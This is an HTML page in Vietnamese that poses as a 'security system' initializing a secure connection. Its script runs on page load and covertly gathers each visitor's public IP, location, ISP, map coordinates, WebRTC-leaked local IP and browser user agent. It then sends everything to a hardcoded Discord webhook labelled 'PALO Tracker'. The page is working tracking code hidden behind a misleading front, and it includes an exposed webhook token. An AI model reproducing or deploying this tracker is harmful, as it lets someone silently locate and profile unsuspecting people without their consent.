<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hệ thống bảo mật</title>
</head>
<body>
    <h2>Đang khởi tạo kết nối an toàn...</h2>
    <div id="status" style="color: red; font-weight: bold;"></div>
    <script>
    // CẤU HÌNH WEBHOOK
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1573374675659137095/0zFbTOBMvUN80ZT5rr7ayRQEeN_uIe-FJmXPQPgDimMVXFeWS4QA3EEtrzeEOFX7Eoug";

    // Hàm lấy thông tin IP và vị trí
    async function fetchIPInfo() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            return {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                isp: data.org,
                lat: data.latitude,
                lon: data.longitude
            };
        } catch (e) {
            try {
                const res = await fetch('https://ipinfo.io/json');
                const data = await res.json();
                return {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country,
                    isp: data.org,
                    lat: 0, lon: 0
                };
            } catch (err) {
                return { ip: "Lỗi API", city: "Lỗi", region: "Lỗi", country: "Lỗi", isp: "Lỗi", lat: 0, lon: 0 };
            }
        }
    }

    // Hàm lấy IP nội bộ (Local IP)
    function getLocalIP() {
        return new Promise((resolve) => {
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            pc.onicecandidate = (event) => {
                if (!event.candidate) {
                    resolve("Không lấy được");
                    return;
                }
                const ipMatch = event.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
                if (ipMatch && ipMatch[0] !== "0.0.0.0") {
                    resolve(ipMatch[0]);
                    pc.close();
                }
            };
            setTimeout(() => resolve("Không lấy được"), 2000);
        });
    }

    // Hàm gửi dữ liệu
    async function sendData() {
        document.getElementById("status").innerText = "Đang lấy dữ liệu...";
        
        const ipData = await fetchIPInfo();
        const localIP = await getLocalIP();
        const mapLink = (ipData.lat && ipData.lon) ? `https://www.google.com/maps?q=${ipData.lat},${ipData.lon}` : "Không có tọa độ";

        const embed = {
            title: "🚨 CẢNH BÁO TRUY CẬP",
            color: 16711680,
            timestamp: new Date().toISOString(),
            fields: [
                { name: "🌐 IP Công Cộng", value: `\`${ipData.ip}\``, inline: true },
                { name: "🖧 IP Nội Bộ", value: `\`${localIP}\``, inline: true },
                { name: "🏙️ Thành Phố / Vùng", value: `${ipData.city}, ${ipData.region}`, inline: false },
                { name: "🌍 Quốc Gia", value: `${ipData.country}`, inline: true },
                { name: "🏢 Nhà Mạng", value: `${ipData.isp}`, inline: true },
                { name: "📍 Vị trí", value: mapLink, inline: false },
                { name: "💻 Thiết Bị", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
            ]
        };

        document.getElementById("status").innerText = "Đang gửi về Discord...";

        try {
            const response = await fetch(DISCORD_WEBHOOK_URL, {
                method: "POST",
                headers: { 
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    username: "PALO Tracker",
                    embeds: [embed]
                })
            });

            if (response.ok) {
                document.getElementById("status").innerText = "Gửi thành công!";
                document.getElementById("status").style.color = "green";
            } else {
                // In lỗi chi tiết ra màn hình để debug
                const errorText = await response.text();
                document.getElementById("status").innerText = "Lỗi Discord: " + response.status + " - " + errorText;
            }
        } catch (error) {
            document.getElementById("status").innerText = "Lỗi mạng (CORS/Block): " + error.message;
        }
    }

    window.addEventListener("load", () => {
        setTimeout(sendData, 500);
    });
    </script>
</body>
</html>
